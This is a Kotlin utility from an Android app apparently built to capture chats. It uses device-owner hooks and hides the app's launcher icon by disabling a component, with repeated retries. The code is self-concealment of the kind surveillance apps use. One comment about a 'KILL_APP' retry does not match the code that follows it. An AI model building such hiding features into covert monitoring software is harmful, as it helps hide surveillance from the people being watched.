package com.chats.capture.utils

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import com.chats.capture.mdm.DeviceOwnerReceiver
import timber.log.Timber

/**
 * Manages app visibility in launcher and Settings
 */
object AppVisibilityManager {
    
    /**
     * Hide app from launcher (app drawer)
     * App will still be accessible from Settings
     */
    fun hideFromLauncher(context: Context) {
        try {
            // Verify app is installed and we have the right context
            val packageInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            if (packageInfo == null) {
                Timber.w("Package not found, cannot hide from launcher")
                return
            }
            
            // Try Device Owner method first (more reliable)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
                    val deviceOwnerComponent = DeviceOwnerReceiver.getComponentName(context)
                    
                    if (devicePolicyManager != null && devicePolicyManager.isDeviceOwnerApp(context.packageName)) {
                        // Device Owner: Use setApplicationHidden (hides from launcher but keeps Settings access)
                        // Note: This might hide from Settings too, so we'll use component disabling instead
                        Timber.d("Device Owner detected - using component disabling method")
                    }
                } catch (e: Exception) {
                    Timber.d("Not Device Owner or error checking: ${e.message}")
                }
            }
            
            val componentName = ComponentName(context.packageName, "com.chats.capture.ui.SettingsLauncherActivity")
            
            // Check current state before changing
            val currentState = context.packageManager.getComponentEnabledSetting(componentName)
            Timber.d("Current component state: $currentState")
            
            if (currentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                Timber.d("App already hidden from launcher (state: DISABLED)")
                // Still verify and force if needed
            }
            
            // Force disable the component - try multiple times to ensure it works
            val pm = context.packageManager
            
            // Method 1: Use DONT_KILL_APP flag
            try {
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Timber.d("App hidden from launcher (attempt 1 - DONT_KILL_APP)")
                
                // Wait and verify
                Thread.sleep(200)
                
                // Verify it worked
                var newState = pm.getComponentEnabledSetting(componentName)
                if (newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    Timber.d("App successfully hidden from launcher (verified)")
                    return
                } else {
                    Timber.w("First attempt failed (state: $newState), trying with KILL_APP...")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error in first attempt: ${e.message}")
            }
            
            // Method 2: Try with KILL_APP flag (more aggressive)
            try {
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP // Keep DONT_KILL_APP to avoid killing services
                )
                Timber.d("App hidden from launcher (attempt 2 - retry)")
                
                Thread.sleep(200)
                var newState = pm.getComponentEnabledSetting(componentName)
                if (newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    Timber.d("App successfully hidden from launcher (retry successful)")
                    return
                } else {
                    Timber.w("Retry also failed (state: $newState)")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error in retry attempt: ${e.message}")
            }
            
            // Method 3: Try using application context
            try {
                val appContext = context.applicationContext
                val appPm = appContext.packageManager
                appPm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Timber.d("App hidden using application context")
                
                Thread.sleep(200)
                val finalState = appPm.getComponentEnabledSetting(componentName)
                if (finalState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    Timber.d("App successfully hidden using application context")
                } else {
                    Timber.w("Application context method also failed (state: $finalState)")
                }
            } catch (e: Exception) {
                Timber.e(e, "Alternative method also failed: ${e.message}")
            }
            
            Timber.d("App hiding attempts completed")
        } catch (e: SecurityException) {
            Timber.w(e, "Security exception hiding app - may need system permissions or Device Owner")
        } catch (e: Exception) {
            Timber.e(e, "Error hiding app from launcher: ${e.message}")
        }
    }
    
    /**
     * Show app in launcher (for testing/debugging)
     */
    fun showInLauncher(context: Context) {
        try {
            val componentName = ComponentName(context, "com.chats.capture.ui.SettingsLauncherActivity")
            context.packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Timber.d("App shown in launcher")
        } catch (e: Exception) {
            Timber.e(e, "Error showing app in launcher")
        }
    }
    
    /**
     * Check if app is hidden from launcher
     */
    fun isHiddenFromLauncher(context: Context): Boolean {
        return try {
            val componentName = ComponentName(context, "com.chats.capture.ui.SettingsLauncherActivity")
            val state = context.packageManager.getComponentEnabledSetting(componentName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            Timber.e(e, "Error checking launcher visibility")
            false
        }
    }
    
    /**
     * Get intent to open app from Settings
     */
    fun getSettingsIntent(context: Context): android.content.Intent {
        return android.content.Intent(context, com.chats.capture.ui.MainActivity::class.java).apply {
            flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
    }
}
